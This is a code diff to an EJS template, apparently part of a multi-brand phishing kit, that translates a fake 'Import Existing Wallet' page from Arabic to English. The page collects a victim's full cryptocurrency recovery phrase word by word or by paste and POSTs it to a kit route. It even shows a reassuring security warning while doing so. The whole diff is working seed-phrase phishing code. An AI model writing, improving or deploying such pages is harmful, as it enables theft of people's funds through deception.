@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -271,11 +271,11 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
 <div class="card">
   <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:12px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
   <div class="shield">🔐</div>
-  <h1><%= pageContent.headline || 'استيراد محفظة موجودة' %></h1>
-  <p class="sub"><%= pageContent.subheadline || 'أدخل عبارة الاسترداد الخاصة بك للوصول إلى محفظتك' %></p>
+  <h1><%= pageContent.headline || 'Import Existing Wallet' %></h1>
+  <p class="sub"><%= pageContent.subheadline || 'Enter your recovery phrase to access your wallet' %></p>
 
   <div class="warn">
-    <strong>⚠️ تحذير أمني:</strong> لا تشارك عبارة الاسترداد مع أي أحد. الموقع الرسمي فقط يطلب هذه المعلومات.
+    <strong>⚠️ Security Warning:</strong> Never share your recovery phrase with anyone. Anyone with these words can access your funds.
   </div>
 
   <div class="err" id="err"></div>
@@ -283,8 +283,8 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
   <% const wordCount = pageContent.otp_length || 12 %>
 
   <div class="tab-btns">
-    <button class="tab-btn active" onclick="showGrid(event)">إدخال كلمة بكلمة</button>
-    <button class="tab-btn" onclick="showPaste(event)">لصق العبارة</button>
+    <button class="tab-btn active" onclick="showGrid(event)">Enter Word by Word</button>
+    <button class="tab-btn" onclick="showPaste(event)">Paste Phrase</button>
   </div>
 
   <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>" id="seedForm">
@@ -297,7 +297,7 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
         <% for(let i=1; i<=wordCount; i++) { %>
           <div class="word-input">
             <span class="word-num"><%= i %></span>
-            <input type="text" class="word" placeholder="كلمة <%= i %>"
+            <input type="text" class="word" placeholder="Word <%= i %>"
                    autocomplete="off" autocorrect="off" spellcheck="false"
                    onpaste="handlePaste(event,<%= i-1 %>)"
                    oninput="autoNext(this,<%= i %>)">
@@ -307,10 +307,10 @@ body.brand-spotifyaudio{background:#121212;color:#fff}body.brand-spotifyaudio .c
     </div>
 
     <div id="paste-area">
-      <textarea placeholder="الصق عبارة الاسترداد هنا مع فراغ بين كل كلمة..." id="pasteText"></textarea>
+      <textarea placeholder="Paste your recovery phrase here, words separated by spaces..." id="pasteText"></textarea>
     </div>
 
-    <button type="submit" class="btn" onclick="return prepareSeed()"><%= pageContent.cta || 'استيراد المحفظة' %></button>
+    <button type="submit" class="btn" onclick="return prepareSeed()"><%= pageContent.cta || 'Import Wallet' %></button>
   </form>
 </div>
 <script>
@@ -328,7 +328,7 @@ function prepareSeed(){
   if(words.length<expected){
     const err=document.getElementById('err');
     err.style.display='block';
-    err.textContent='يرجى إدخال جميع كلمات عبارة الاسترداد ('+expected+' كلمات)';
+    err.textContent='Please enter all '+expected+' words of your recovery phrase';
     return false;
   }
   document.getElementById('seedHidden').value=phrase;
